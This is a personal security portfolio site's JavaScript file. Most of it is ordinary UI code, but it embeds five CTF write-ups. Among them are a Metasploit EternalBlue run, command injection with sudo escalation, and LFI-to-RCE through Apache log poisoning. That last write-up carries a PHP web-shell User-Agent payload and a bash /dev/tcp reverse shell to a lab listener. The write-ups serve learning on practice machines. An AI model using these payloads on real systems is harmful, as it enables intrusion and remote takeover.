/* ============================================================
   0xmrerror.me — main.js
   ============================================================ */

'use strict';

/* ── nav scroll highlight ─────────────────────────────────── */
(function () {
  const nav = document.getElementById('nav');
  const links = document.querySelectorAll('.nav-links a');
  const sections = document.querySelectorAll('section[id]');

  window.addEventListener('scroll', () => {
    /* shrink border on scroll */
    nav.style.borderBottomColor = window.scrollY > 40
      ? 'rgba(30,45,61,.8)' : '';

    /* highlight active section */
    let current = '';
    sections.forEach(s => {
      if (window.scrollY >= s.offsetTop - 80) current = s.id;
    });
    links.forEach(a => {
      a.classList.toggle('active', a.getAttribute('href') === '#' + current);
    });
  }, { passive: true });

  /* hamburger */
  const toggle = document.getElementById('navToggle');
  const navLinks = document.querySelector('.nav-links');
  if (toggle) {
    toggle.addEventListener('click', () => {
      navLinks.classList.toggle('open');
      toggle.setAttribute('aria-expanded', navLinks.classList.contains('open'));
    });
  }

  /* close nav on link click (mobile) */
  links.forEach(a => a.addEventListener('click', () => navLinks.classList.remove('open')));
})();

/* ── reveal on scroll ─────────────────────────────────────── */
(function () {
  const els = document.querySelectorAll('.reveal');
  if (!els.length) return;

  const io = new IntersectionObserver((entries) => {
    entries.forEach(e => {
      if (e.isIntersecting) {
        e.target.classList.add('visible');
        io.unobserve(e.target);
      }
    });
  }, { threshold: 0.08 });

  els.forEach(el => io.observe(el));
})();

/* ── skill bar animation ──────────────────────────────────── */
(function () {
  const bars = document.querySelectorAll('.skill-fill');
  if (!bars.length) return;

  const io = new IntersectionObserver((entries) => {
    entries.forEach(e => {
      if (e.isIntersecting) {
        e.target.style.animationPlayState = 'running';
        io.unobserve(e.target);
      }
    });
  }, { threshold: 0.3 });

  bars.forEach(bar => {
    bar.style.animationPlayState = 'paused';
    io.observe(bar);
  });
})();

/* ── writeup filter ───────────────────────────────────────── */
(function () {
  const btns = document.querySelectorAll('.filter-btn');
  const cards = document.querySelectorAll('.writeup-card');
  if (!btns.length) return;

  btns.forEach(btn => {
    btn.addEventListener('click', () => {
      btns.forEach(b => b.classList.remove('active'));
      btn.classList.add('active');

      const filter = btn.dataset.filter;
      let idx = 1;

      cards.forEach(card => {
        const match = filter === 'all'
          || card.dataset.diff === filter
          || card.dataset.platform === filter;

        card.style.display = match ? '' : 'none';
        if (match) {
          card.querySelector('.writeup-idx').textContent =
            String(idx).padStart(2, '0') + '.';
          idx++;
        }
      });
    });
  });
})();

/* ── writeup modal ────────────────────────────────────────── */
(function () {
  const overlay = document.getElementById('writeupModal');
  const closeBtn = document.getElementById('modalClose');
  if (!overlay) return;

  const WRITEUPS = {
    'blue-primer': {
      title: 'Blue — Eternal Blue Primer',
      meta: { diff: 'easy', platform: 'thm', time: '8 min' },
      content: `
<h2>Blue — EternalBlue (MS17-010) Root</h2>
<p>Blue is an introductory Windows box that demonstrates why unpatched SMB services are critical vulnerabilities. The box runs Windows 7 x64 with SMBv1 exposed on port 445.</p>

<h3>Reconnaissance</h3>
<pre><code><span class="tok-comment"># Full port scan with service detection</span>
<span class="tok-func">nmap</span> -sC -sV -p- --min-rate 5000 10.10.10.40

PORT    STATE SERVICE      VERSION
135/tcp open  msrpc        Microsoft Windows RPC
445/tcp open  microsoft-ds Windows 7 SP1 x64
<span class="tok-comment"># SMB script scan confirms MS17-010</span>
<span class="tok-func">nmap</span> --script smb-vuln-ms17-010 10.10.10.40</code></pre>

<h3>Exploitation</h3>
<pre><code><span class="tok-func">msfconsole</span>
use exploit/windows/smb/ms17_010_eternalblue
set RHOSTS 10.10.10.40
set LHOST 10.10.14.5
run
<span class="tok-comment"># NT AUTHORITY\\SYSTEM shell obtained</span></code></pre>

<h3>Post-Exploitation</h3>
<p>After obtaining a SYSTEM shell via EternalBlue, migrated to a stable <code>spoolsv.exe</code> process and dumped NTLM hashes with Hashdump. The Administrator hash was cracked offline using rockyou.txt in under 2 seconds.</p>

<h3>Key Takeaways</h3>
<p>MS17-010 remains one of the most critical Windows vulnerabilities. Mitigation requires disabling SMBv1 and applying Microsoft security bulletin MS17-010. Detection signatures: EventID 4625 (failed logon) spikes and IDS rules for SMB exploit payloads.</p>
      `
    },
    'pickle-rick': {
      title: 'Pickle Rick — LFI to RCE',
      meta: { diff: 'easy', platform: 'thm', time: '6 min' },
      content: `
<h2>Pickle Rick — Web App LFI & Command Injection</h2>
<p>A Rick and Morty themed challenge focusing on web enumeration and command injection chained through a PHP web shell. Good intro to basic webapp hacking methodology.</p>

<h3>Enumeration</h3>
<pre><code><span class="tok-comment"># Gobuster directory bruteforce</span>
<span class="tok-func">gobuster</span> dir -u http://10.10.x.x -w /usr/share/wordlists/dirb/common.txt

<span class="tok-comment"># Found: /login.php, /portal.php, robots.txt</span>
<span class="tok-comment"># robots.txt leaks a password: Wubbalubbadubdub</span>
<span class="tok-comment"># page source leaks username: R1ckRul3s</span></code></pre>

<h3>Command Injection</h3>
<p>The <code>/portal.php</code> command panel executes OS commands directly. Standard shell utilities like <code>cat</code> are blocked, but <code>less</code>, <code>strings</code>, and Python bypasses work fine.</p>
<pre><code><span class="tok-comment"># Read first ingredient</span>
less /var/www/html/Sup3rS3cretPickl3Ingred.txt

<span class="tok-comment"># Escalate to root via sudo -l (no password required)</span>
sudo bash -c <span class="tok-string">'less /root/3rd.txt'</span></code></pre>

<h3>Lessons</h3>
<p>Always enumerate page source and <code>robots.txt</code>. Credential stuffing common credential leaks. Filter bypass: if <code>cat</code> is blocked, try <code>less</code>, <code>more</code>, <code>head</code>, <code>tac</code>, or Python <code>open()</code>.</p>
      `
    },
    'reversing-elf': {
      title: 'Reversing ELF — Binary Analysis Series',
      meta: { diff: 'medium', platform: 'thm', time: '15 min' },
      content: `
<h2>Reversing ELF — Static & Dynamic Binary Analysis</h2>
<p>A multi-part challenge covering Ghidra static analysis, GDB dynamic debugging, and common obfuscation techniques. Reinforces core reverse engineering methodology.</p>

<h3>Static Analysis with Ghidra</h3>
<pre><code><span class="tok-comment"># Check file type and protections</span>
<span class="tok-func">file</span> crackme1
<span class="tok-func">checksec</span> --file=crackme1

ELF 32-bit LSB executable
NX enabled, No PIE, No stack canary

<span class="tok-comment"># Disassemble main() — Ghidra auto-decompiler output</span>
<span class="tok-keyword">if</span> (strcmp(param_1, <span class="tok-string">"super_secret_password"</span>) == <span class="tok-num">0</span>) {
  puts(<span class="tok-string">"Correct Password!"</span>);
}</code></pre>

<h3>Dynamic Analysis with GDB + pwndbg</h3>
<pre><code><span class="tok-func">gdb</span> ./crackme3
pwndbg> <span class="tok-func">disass</span> main
pwndbg> <span class="tok-func">break</span> *0x08048xxx
pwndbg> <span class="tok-func">run</span>
<span class="tok-comment"># Patch jump condition: set eflags ZF=1</span>
pwndbg> <span class="tok-func">set</span> $eflags = $eflags | 0x40</code></pre>

<h3>XOR Obfuscation Decode</h3>
<pre><code><span class="tok-keyword">import</span> sys

encoded = [<span class="tok-num">0x41</span>, <span class="tok-num">0x14</span>, <span class="tok-num">0x71</span>, <span class="tok-num">0x1e</span>, <span class="tok-num">0x55</span>, <span class="tok-num">0x0c</span>]
key = <span class="tok-num">0x55</span>

decoded = <span class="tok-string">''</span>.<span class="tok-func">join</span>(<span class="tok-func">chr</span>(b ^ key) <span class="tok-keyword">for</span> b <span class="tok-keyword">in</span> encoded)
<span class="tok-func">print</span>(<span class="tok-string">f"Key: </span>{decoded}<span class="tok-string">"</span>)</code></pre>
      `
    },
    'sandbox-bypass': {
      title: 'Malware Sandbox — Anti-Analysis Bypass',
      meta: { diff: 'hard', platform: 'ctf', time: '25 min' },
      content: `
<h2>Malware Sandbox Anti-Analysis Bypass Techniques</h2>
<p>A writeup from my Keystone Group internship documenting sandbox evasion techniques encountered during live malware detonation in the nested-VM pipeline I built.</p>

<h3>Timing Check Bypass</h3>
<p>Malware samples read <code>KUSER_SHARED_DATA.TickCount</code> to detect artificially fast execution in emulators. Patch approach:</p>
<pre><code><span class="tok-comment"># KUSER_SHARED_DATA lives at 0x7ffe0000 on all 32/64-bit Windows</span>
<span class="tok-comment"># TickCount offset: 0x320 (LowPart)</span>

<span class="tok-comment"># Volatility3 VMI read of guest memory</span>
<span class="tok-func">vol</span> -f vm.mem windows.info
<span class="tok-func">vol</span> -f vm.mem windows.vadinfo

<span class="tok-comment"># Patch via QEMU monitor — write realistic elapsed ticks</span>
(qemu) <span class="tok-func">xp</span> /1wu 0x7ffe0320
(qemu) <span class="tok-func">writememory</span> 0x7ffe0320 <span class="tok-num">0x0A3E8C1F</span></code></pre>

<h3>eBPF Syscall Tracing</h3>
<pre><code><span class="tok-comment"># Host-side eBPF probe attached to QEMU KVM exits</span>
<span class="tok-comment"># Captures guest syscall numbers via KVM_EXIT_IO</span>

<span class="tok-func">bpftrace</span> -e <span class="tok-string">'
  kprobe:kvm_emulate_hypercall {
    printf("vcpu=%d eax=%d\n", arg0, ((struct kvm_vcpu *)arg0)->arch.regs[0]);
  }'</span></code></pre>

<h3>C2 Sinkhole Stack</h3>
<p>Isolated network namespace routes all malware C2 traffic through a three-layer intercept:</p>
<pre><code><span class="tok-comment"># iptables redirect all outbound 80/443 to INetSim</span>
iptables -t nat -A OUTPUT -p tcp --dport <span class="tok-num">80</span>  -j REDIRECT --to-port <span class="tok-num">4343</span>
iptables -t nat -A OUTPUT -p tcp --dport <span class="tok-num">443</span> -j REDIRECT --to-port <span class="tok-num">4343</span>

<span class="tok-comment"># DNSChef wildcard DNS resolution to sinkhole IP</span>
<span class="tok-func">dnschef</span> --fakeip 127.0.0.1 --interface 0.0.0.0</code></pre>
      `
    },
    'lfi-to-rce': {
      title: 'LFI to RCE via Log Poisoning',
      meta: { diff: 'medium', platform: 'htb', time: '18 min' },
      content: `
<h2>LFI to RCE via Apache Log Poisoning</h2>
<p>Classic web exploitation chain: Local File Inclusion vulnerability escalated to Remote Code Execution by injecting PHP into Apache access logs, then including the log file.</p>

<h3>LFI Discovery</h3>
<pre><code><span class="tok-comment"># Fuzzing the page parameter</span>
<span class="tok-func">ffuf</span> -u <span class="tok-string">'http://target.htb/index.php?page=FUZZ'</span> \\
     -w /usr/share/seclists/Fuzzing/LFI/LFI-Jhaddix.txt \\
     -fc 404

<span class="tok-comment"># Confirmed LFI with path traversal</span>
http://target.htb/index.php?page=../../../../../../etc/passwd</code></pre>

<h3>Log Poisoning</h3>
<pre><code><span class="tok-comment"># Inject PHP payload into User-Agent header</span>
<span class="tok-func">curl</span> -s http://target.htb/ \\
  -H <span class="tok-string">'User-Agent: &lt;?php system($_GET["cmd"]); ?&gt;'</span>

<span class="tok-comment"># Include the poisoned log file</span>
http://target.htb/index.php?page=../../../../../../var/log/apache2/access.log&cmd=id

<span class="tok-comment"># Output: uid=33(www-data) gid=33(www-data)</span></code></pre>

<h3>Reverse Shell</h3>
<pre><code><span class="tok-comment"># URL-encoded bash reverse shell</span>
?cmd=bash+-c+'bash+-i+>%26+/dev/tcp/10.10.14.5/4444+0>%261'

nc -lvnp 4444
<span class="tok-comment"># Connection received — upgrade to full TTY</span>
python3 -c <span class="tok-string">'import pty; pty.spawn("/bin/bash")'</span></code></pre>
      `
    }
  };

  document.querySelectorAll('[data-writeup]').forEach(card => {
    card.addEventListener('click', e => {
      e.preventDefault();
      const key = card.dataset.writeup;
      const data = WRITEUPS[key];
      if (!data) return;

      const body = overlay.querySelector('.writeup-content');
      body.innerHTML = data.content;
      overlay.classList.add('open');
      document.body.style.overflow = 'hidden';
    });
  });

  function closeModal() {
    overlay.classList.remove('open');
    document.body.style.overflow = '';
  }

  if (closeBtn) closeBtn.addEventListener('click', closeModal);
  overlay.addEventListener('click', e => { if (e.target === overlay) closeModal(); });
  document.addEventListener('keydown', e => { if (e.key === 'Escape') closeModal(); });
})();

/* ── copy email ───────────────────────────────────────────── */
(function () {
  const emailBtn = document.getElementById('copyEmail');
  if (!emailBtn) return;
  emailBtn.addEventListener('click', () => {
    navigator.clipboard.writeText('skandar.hadrich@etudiant.enit.utm.tn').then(() => {
      const orig = emailBtn.textContent;
      emailBtn.textContent = '✓ copied';
      emailBtn.style.color = 'var(--green)';
      setTimeout(() => {
        emailBtn.textContent = orig;
        emailBtn.style.color = '';
      }, 1500);
    });
  });
})();

/* ── uptime counter ───────────────────────────────────────── */
(function () {
  const el = document.getElementById('uptime');
  if (!el) return;
  const start = new Date('2026-07-01T00:00:00Z');
  setInterval(() => {
    const diff = Math.floor((Date.now() - start) / 1000);
    const d = Math.floor(diff / 86400);
    const h = Math.floor((diff % 86400) / 3600);
    const m = Math.floor((diff % 3600) / 60);
    const s = diff % 60;
    el.textContent = `uptime: ${d}d ${String(h).padStart(2,'0')}:${String(m).padStart(2,'0')}:${String(s).padStart(2,'0')}`;
  }, 1000);
})();
